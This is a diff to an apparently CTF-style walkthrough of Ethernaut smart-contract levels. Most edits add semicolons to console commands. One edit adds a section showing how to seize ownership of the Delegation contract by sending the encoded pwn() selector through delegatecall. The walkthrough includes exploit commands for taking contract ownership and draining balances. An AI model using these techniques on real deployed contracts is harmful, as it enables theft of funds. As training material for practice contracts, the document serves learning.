@@ -62,7 +62,7 @@ await contract.contribute({ value: 1 });
 You can also check that the contribution was successful by calling the following line
 
 ```js
-await contract.contributions(player).then(Number)
+await contract.contributions(player).then(Number);
 ```
 if the number is greater than zero, then you did it.
 
@@ -74,7 +74,7 @@ await contract.sendTransaction({ value: 1 })
 Now if the transaction was successful, we must be the new owners of this contract, let's check that.
 
 ```js
-await contract.owner().then(owner => owner === player)
+await contract.owner().then(owner => owner === player);
 ```
 #### Reducing the balance to 0
 The way to reduce the balance to 0 is by using the `withdraw` function, which sends all the current balance to the owner.
@@ -88,7 +88,7 @@ The way to reduce the balance to 0 is by using the `withdraw` function, which se
 We are the owners of the contract, let's take those coins!
 
 ```js
-await contract.withdraw()
+await contract.withdraw();
 ```
 ---
 
@@ -117,7 +117,7 @@ await contract.Fal1out({ value: 1 });
 then you can check the ownership of the contract
 
 ```js
-await contract.owner().then(owner => owner === player)
+await contract.owner().then(owner => owner === player);
 ```
 
 And we are done!
@@ -195,5 +195,31 @@ await contract.transfer('<some_random_address>', 21);
 Check your balance after the transaction:
 
 ```js
-await contract.balanceOf(player).then(Number)
+await contract.balanceOf(player).then(Number);
+```
+---
+
+### 5. Delegation
+
+One important property of `delegatecall` is that executes other contractact's code in the context of the current contract.
+
+Which means that we can claim the ownership of `Delegation` contract using the `pwn` function of the `Delegate` one.
+
+```sol
+function pwn() public {
+  owner = msg.sender;
+}
+```
+In order to do so, we need to invoke the `fallback` function of the `Delegation` contract, sending on `msg.data` the encoded name of function we want to delegate (in this case `pwn()`).
+
+But first we need to encode the `pwn` function name in order to make it work. You can use [this online encoder](https://abi.hashex.org/) to get the right encoded name. As a result we get the following code: `dd365b8b`.
+
+```JS
+contract.sendTransaction({ data: 'dd365b8b' });
+```
+
+And that's it! now let's check if works:
+
+```JS
+await contract.owner().then(owner => owner === player);
 ```
